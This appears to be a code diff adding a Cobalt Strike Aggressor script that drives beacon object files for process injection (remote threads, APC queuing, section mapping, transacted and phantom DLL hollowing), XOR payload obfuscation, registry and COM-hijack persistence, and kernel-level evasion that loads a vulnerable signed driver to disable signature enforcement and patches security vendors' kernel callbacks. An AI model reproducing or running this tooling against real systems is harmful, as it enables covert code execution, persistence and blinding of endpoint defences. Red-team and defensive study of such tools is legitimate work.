+    if($params["cleanup"] eq 'true') {
+        $cleanup = 1;
+    }
+
+    $args = bof_pack($bid, "zzi", $params["clsid"], $params["dllpath"], $cleanup);
+
+    # Run
+    btask($bid, "Running PersistScheduledTaskCOMHijack");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub createremotethread {
+    local('$bid $args $params $payload $bof');
+    $bid = $1;
+    $params = $2;
+
+    # Handle payload
+    if($params["listener"]){
+        $payload = payloadhandler($bid, $params);
+    }
+    else if($params["payloadpath"]){
+        $payload = readpayload($params["payloadpath"]);
+    }
+    else {
+        $payload = payloadfromb64($params["payloadb64"]);
+    }
+
+    # Read BOF
+    $bof = readbof($CreateRemoteThread);
+
+    # Pack args
+    $args = bof_pack($bid, "ib", parseNumber($params["pid"], 10), $payload);
+
+    # Run
+    btask($bid, "Running CreateRemoteThread");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub queueuserapc {
+    local('$bid $args $params $payload $bof');
+    $bid = $1;
+    $params = $2;
+
+    # Handle payload
+    if($params["listener"]){
+        $payload = payloadhandler($bid, $params);
+    }
+    else if($params["payloadpath"]){
+        $payload = readpayload($params["payloadpath"]);
+    }
+    else {
+        $payload = payloadfromb64($params["payloadb64"]);
+    }
+
+    # Read BOF
+    $bof = readbof($QueueUserAPC);
+
+    # Pack args
+    $args = bof_pack($bid, "ibi", parseNumber($params["pid"]), $payload, parseNumber($params["threads"], 10));
+
+    # Run
+    btask($bid, "Running QueueUserAPC");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub mapviewofsection {
+    local('$bid $args $params $payload $bof');
+    $bid = $1;
+    $params = $2;
+
+    # Handle payload
+    if($params["listener"]){
+        $payload = payloadhandler($bid, $params);
+    }
+    else if($params["payloadpath"]){
+        $payload = readpayload($params["payloadpath"]);
+    }
+    else {
+        $payload = payloadfromb64($params["payloadb64"]);
+    }
+
+    # Read BOF
+    $bof = readbof($MapViewOfSection);
+
+    # Pack args
+    $args = bof_pack($bid, "zzb", $params["parent"], $params["processpath"], $payload);
+
+    # Run
+    btask($bid, "Running MapViewOfSection");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub transactedhollowing {
+    local('$bid $args $params $payload $bof');
+    $bid = $1;
+    $params = $2;
+
+    # Handle payload
+    if($params["listener"]){
+        $payload = payloadhandler($bid, $params);
+    }
+    else if($params["payloadpath"]){
+        $payload = readpayload($params["payloadpath"]);
+    }
+    else {
+        $payload = payloadfromb64($params["payloadb64"]);
+    }
+
+    # Read BOF
+    $bof = readbof($TransactedHollowing);
+
+    # Pack args
+    $args = bof_pack($bid, "zzb", $params["parent"], $params["processpath"], $payload);
+
+    # Run
+    btask($bid, "Running TransactedHollowing");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+sub phantomdllhollowing {
+    #local('$bid $args $params $payload $bof');
+    #$bid = $1;
+    #$params = $2;
+
+    # Handle payload
+    #if($params["listener"]){
+    #    $payload = payloadhandler($bid, $params);
+    #}
+    #else if($params["payloadpath"]){
+    #    $payload = readpayload($params["payloadpath"]);
+    #}
+    #else {
+    #    $payload = payloadfromb64($params["payloadb64"]);
+    #}
+
+    # Read BOF
+    #$bof = readbof($PhantomDLLHollowing);
+
+    # Pack args
+    #$args = bof_pack($bid, "zzb", $params["parent"], $params["processpath"], $payload);
+
+    # Run
+    #btask($bid, "Running PhantomDLLHollowing");
+    #beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+
+#=======================================================================================================================================================#
+#                                                                      Extension methods                                                                #
+#=======================================================================================================================================================#
+
+
+sub readbof {
+    local('$bofhandle $bof $data');
+    $bof = $1;
+    $bofhandle = openf($bof);
+    $data = readb($bofhandle, -1);
+    closef($bofhandle);
+
+    return $data;
+}
+
+sub xor
+{
+    local('$payload $buf $key');
+    $payload = $1;
+    $key = strlen($payload) % 255;
+
+    for($i = 0; $i < strlen($payload); $i++)
+    {
+        $buf .= chr(asc(charAt($payload, $i)) ^ $key);
+    }
+
+    return $buf;
+}
+
+
+#=======================================================================================================================================================#
+#                                                                           Helpers                                                                     #
+#=======================================================================================================================================================#
+
+
+sub spawnprocesshelp {
+    show_message("
+        Description:
+            Spawns a new sacrificial process in a suspended state. Non-Microsoft signed binaries are blocked.
+
+        Options:
+            Parent process: The name of the process to set as parent
+            Executable location: The location of the executable on disk to be used to spawn a new process
+
+        Output: PID of the newly spawned process
+    ");
+}
+
+sub registryhelp {
+    show_message("
+        Description:
+            Create or modify a registry key at the specified location
+
+        Options:
+            Key name: Value name
+            Command: Command to be ran when registry is used
+            Registry key: Location where registry key will be created
+            Hidden: Will prepend a null byte to the key name; throws errors in regedit
+            Cleanup: Removes created key
+
+        Cleanup requirements:
+            Cleanup requires the key name and registry key (location)
+
+        Note:
+            UserInit: Automatically sets 'Key name' and 'Registry key'
+            UserInitMprLogonScript: Automatically sets 'Key name'and 'Registry key'
+    ");
+}
+
+sub scheduledtaskcomhijackhelp {
+    show_message("
+        Description:
+            Hijacks a scheduled task's COM handler
+            Creates a registry key at HKCU:\\Software\\Classes\\CLSID\\<CLSID>\\InprocServer32 that points to a DLL
+
+        Options:
+            Class ID: The CLSID that corresponds to the task's COM handler CLSID
+            DLL path: Path to DLL that is to be loaded
+            Cleanup: Removes created key
+    ");
+}
+
+sub disabledsehelp {
+    show_message("
+        Description:
+            Loads a vulnerable signed driver with arbitrary kernel memory read/write
+            Changes the ntoskrnl.exe g_CiEnabled or CI.dll g_CiOptions state
+
+        Options:
+            Vulnerable driver location: Location of vulnerable signed driver in binary form on disk
+            Malicious driver location: Location of the malicious non-signed driver in binary form on disk
+            Vulnerable driver name: name used to create the registry key '\\Registry\\Machine\\System\\CurrentControlSet\\Services\\<name>'
+            Vulnerable driver device name: name used to contact the driver '\\DosDevices\\<name>'
+            Malicious driver name: name used to create the registry key '\\Registry\\Machine\\System\\CurrentControlSet\\Services\\<name>'
+            Malicious driver device name: name used to contact the driver '\\DosDevices\\<name>'
+            Target path: temporary path to write the vulnerable and malicious driver files to
+    ");
+}
+
+sub unloaddriverhelp {
+    show_message("
+        Description:
+            Unloads a driver on the target using the provided registry key and deletes the binary from disk at the specified path.
+
+        Options:
+            Driver registry key: registry key used to unload driver '\\Registry\\Machine\\System\\CurrentControlSet\\Services\\<name>'
+            Driver installation path: location of driver on disk
+    ");
+}
+
+sub interceptinfohelp {
+    show_message("
+        Description:
+            Query the Interceptor driver
+
+        Options:
+            Vendors: display supported vendors
+            Modules: query all loaded drivers
+            Hooked modules: display all hooked drivers
+            Callbacks: query all registered callbacks
+    ");
+}
+
+sub intercepthookhelp {
+    show_message("
+        Description:
+            Hook the target driver's major functions (IRP)
+
+        Options: 
+            Action:
+                Index: hook a driver by index (see: information - modules)
+                Name: hook a driver by device name (\\Device\\Name)
+            Values: comma separated list of indexes (conditional)
+            Name: device name of the target driver (conditional)
+
+        Conditional:
+            Values are required when 'Index' is selected
+            Name is required when 'Name' is selected
+    ");
+}
+
+sub interceptunhookhelp {
+    show_message("
+        Description:
+            Restore the target driver's major functions
+        
+        Options: 
+            Action:
+                Index: unhook a driver by index (see: information - hooked modules)
+                All: unhook all hooked drivers
+            Values: comma separated list of indexes (conditional)
+
+        Conditional:
+            Values is required when 'Index' is selected
+    ");
+}
+
+sub interceptpatchhelp {
+    show_message("
+        Description:
+            Patch the target kernel callbacks
+
+        Options: 
+            Action:
+                Vendor: patch all callbacks associated with vendor module(s)
+                Module: patch all callbacks associated with module(s)
+                Process: patch process callback(s)
+                Thread: patch thread callback(s)
+                Image: patch image callback(s)
+                Registry: patch registry callback(s)
+                Object process: patch object process callbac(s)
+                Object thread: patch object thread callback(s)
+            Values: comma separated list of indexes (see: information - callbacks) (conditional)
+            Name: comma separated list of module names or single vendor name (see: information - vendors) (conditional)
+
+        Conditional:
+            Values is required when 'process', 'thread', 'image', 'registry', 'object process' or 'object thread' is selected
+            Name is required when 'vendor' or 'module' is selected
+    ");
+}
+
+sub interceptrestorehelp {
+    show_message("
+        Description:
+            Restore the target kernel callbacks
+
+        Options: 
+            Action:
+                Vendor: restore all callbacks associated with vendor module(s)
+                Module: restore all callbacks associated with module(s)
+                Process: restore process callback(s)
+                Thread: restore thread callback(s)
+                Image: restore image callback(s)
+                Registry: restore registry callback(s)
+                Object process: restore object process callbac(s)
+                Object thread: restore object thread callback(s)
+                All: restore all callbacks
+            Values: comma separated list of indexes (see: information - callbacks) (conditional)
+            Name: comma separated list of module names or single vendor name (see: information - vendors) (conditional)
+
+        Conditional:
+            Values is required when 'process', 'thread', 'image', 'registry', 'object process' or 'object thread' is selected
+            Name is required when 'vendor' or 'module' is selected
+    ");
+}
+
+sub createremotethreadhelp {
+    show_message("
+        Description
+            Injects a payload into a remote process using NtCreateThreadEx
+
+        Options:
+            Process PID: The process ID of the remote process
+            Payload location: Location of payload in binary form on disk (Conditional | Optional)
+            Payload b64: Raw shellcode in base64 encoded string format (Conditional | Optional)
+            Listener: Listener to generate shellcode for (Conditional)
+
+        Conditional:
+            A listener is required to generate a payload
+            Specify either the 'Payload location' or 'Payload b64' when manually providing a payload
+    ");
+}
+
+sub queueuserapchelp {
+    show_message("
+        Description:
+            Injects a payload into a remote process using NtQueueApcThread
+
+        Options:
+            Process PID: The process ID of the remote process
+            Threads: Number of threads to add an APC call to
+            Payload location: Location of payload in binary form on disk (Conditional | Optional)
+            Payload b64: Raw shellcode in base64 encoded string format (Conditional | Optional)
+            Listener: Listener to generate shellcode for (Conditional)
+
+        Conditional:
+            A listener is required to generate a payload
+            Specify either the 'Payload location' or 'Payload b64' when manually providing a payload
+
+    ");
+}
+
+sub mapviewofsectionhelp {
+    show_message("
+        Description:
+            Injects a payload into a surrogate process using NtMapViewOfSection
+
+        Options:
+            Parent process: The name of the process to set as parent
+            Executable location: The location of the executable on disk to be used to spawn a new process
+            Payload location: Location of payload in binary form on disk (Conditional | Optional)
+            Payload b64: Raw shellcode in base64 encoded string format (Conditional | Optional)
+            Listener: Listener to generate shellcode for (Conditional)
+
+        Conditional:
+            A listener is required to generate a payload
+            Specify either the 'Payload location' or 'Payload b64' when manually providing a payload
+    ");
+}
+
+sub transactedhollowinghelp {
+    show_message("
+        Description:
+            Injects x64 PE into a surrogate process using Transacted sections
+
+        Options:
+            Parent process: The name of the process to set as parent
+            Executable location: The location of the executable on disk to be used to spawn a new process
+            Payload location: Location of x64 PE payload on disk (Conditional | Optional)
+            Payload b64: x64 PE in base64 encoded string format (Conditional | Optional)
+            Listener: Listener to generate payload for (Conditional)
+        
+        Conditional:
+            A listener is required to generate a payload
+            Specify either the 'Payload location' or 'Payload b64' when manually providing a payload
+    ");
+}
+
+sub phantomdllhollowinghelp {
+    show_message("
+        Description:
+            Injects Position Independent Shellcode (PIC) into a surrogate process using Transactions to hollow a legitimate system DLL and mapping it into the remote process
+
+        Options:
+            Parent process: The name of the process to set as parent
+            Executable location: The location of the executable on disk to be used to spawn a new process
+            Payload location: Location of payload in binary form on disk (Conditional | Optional)
+            Payload b64: Raw shellcode in base64 encoded string format (Conditional | Optional)
+            Listener: Listener to generate shellcode for (Conditional)
+        
+        Conditional:
+            A listener is required to generate a payload
+            Specify either the 'Payload location' or 'Payload b64' when manually providing a payload
+
+        Requirements:
+            Phantom DLL Hollowing requires elevated privileges to open system DLL's with FILE_WRITE permissions
+    ");
+}
